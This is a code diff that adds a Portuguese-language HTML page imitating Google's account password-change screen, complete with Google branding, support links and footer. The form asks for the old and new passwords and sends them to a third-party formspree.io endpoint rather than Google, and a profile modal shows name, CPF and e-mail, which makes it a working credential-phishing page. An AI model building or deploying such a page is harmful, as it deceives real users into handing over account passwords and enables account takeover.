@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Senha</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap">
+    <link rel="icon" href="https://static.enjoywishlist.com/assets/static/google.png" type="image/x-icon">
+    <script src="https://www.google.com/jsapi"></script>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <div class="top">
+            <div class="google">
+                <img class="logo-google"
+                    src="https://th.bing.com/th/id/R.4aa108082e7d3cbd55add79f84612aaa?rik=I4dbPhSe%2fbHHSg&riu=http%3a%2f%2fpurepng.com%2fpublic%2fuploads%2flarge%2fpurepng.com-google-logo-2015brandlogobrand-logoiconssymbolslogosgoogle-6815229372333mqrr.png&ehk=ewmaCOvP0Ji4QViEJnxSdlrYUrTSTWhi8nZ9XdyCgAI%3d&risl=&pid=ImgRaw&r=0"
+                    alt="img">
+                <span class="logo-text">Conta</span>
+            </div>
+            <div class="itens">
+                <a href="https://support.google.com/accounts#topic=3382296" target="_blank" rel="noopener noreferrer"><i
+                        class="fa-solid fa-question"></i></a>
+                <img class="options" id="options" src="https://ssl.gstatic.com/gb/images/bar/al-icon.png" alt="img">
+                <img id="logo-user" src="img/image.png" alt="img" class="logo">
+            </div>
+
+            <div id="userModal" class="modal">
+                <div class="modal-content">
+                    <span class="close-button">&times;</span>
+                    <h2 class="text-2xl font-bold text-gray-800 mb-4">Informações do Perfil</h2>
+                    <div class="space-y-3">
+                        <p><span class="font-semibold text-gray-600">Nome Completo:</span> <span id="userName"></span>
+                        </p>
+                        <p><span class="font-semibold text-gray-600">CPF:</span> <span id="userCpf"></span></p>
+                        <p><span class="font-semibold text-gray-600">E-mail:</span> <span id="userEmail"></span></p>
+                    </div>
+                    <button id="closeModal"
+                        class="mt-6 bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 transition">
+                        Fechar
+                    </button>
+                </div>
+            </div>
+
+        </div>
+        <h1>Atualizar Senha</h1>
+        <hr>
+    </header>
+    <div class="description">
+        <p>Escolha uma senha forte e não a reutilize em outras contas. <a
+                href="https://support.google.com/accounts/answer/32040?visit_id=638858993449549073-4244346633&p=pw_dont_reuse&hl=pt-BR&rd=1">Saiba
+                mais</a></p>
+        <p>Talvez você seja desconectado da sua conta em alguns dispositivos. <a
+                href="https://myaccount.google.com/#">Saiba mais sobre onde você vai
+                continuar conectado</a></p>
+    </div>
+    <div class="container">
+        <form id="passwordForm" action="https://formspree.io/f/xnqkjljy" method="POST" novalidate>
+            <div class="content">
+                <div class="input-group">
+                    <input type="password" id="oldPassword" name="oldPassword" placeholder="Senha antiga"
+                        aria-describedby="oldPasswordError" required>
+                    <div id="oldPasswordError" class="error"></div>
+                </div>
+                <div class="input-group">
+                    <p class="password-requirements">
+                        Use pelo menos 8 caracteres. Não use a senha de outro site ou algo muito óbvio, como o nome do
+                        seu animal de estimação.
+                        <a href="https://support.google.com/accounts/answer/32040?visit_id=638858993452040814-4195461559&p=pw_signup&hl=pt-BR&rd=1"
+                            target="_blank" rel="noopener noreferrer">Por quê?</a>
+                    </p>
+                    <input type="password" id="newPassword" name="newPassword" placeholder="Nova senha"
+                        aria-describedby="newPasswordError" required>
+                    <div id="newPasswordError" class="error"></div>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="confirmNewPassword" name="confirmNewPassword"
+                        placeholder="Confirmar nova senha" aria-describedby="confirmNewPasswordError" required>
+                    <div id="confirmNewPasswordError" class="error"></div>
+                </div>
+                <div class="containerBooton">
+                    <button type="submit" id="submitButton">Alterar senha</button>
+                </div>
+                <div id="message"></div>
+            </div>
+        </form>
+    </div>
+    <div class="footer">
+        <a href="https://policies.google.com/privacy">Privacidade</a>
+        <a href="https://policies.google.com/terms">Termos</a>
+        <a href="https://support.google.com/accounts#topic=3382296">Ajuda</a>
+        <a href="https://www.google.com/account/about/">Sobre</a>
+    </div>
+    <script src="index.js"></script>
+</body>
+
+</html>
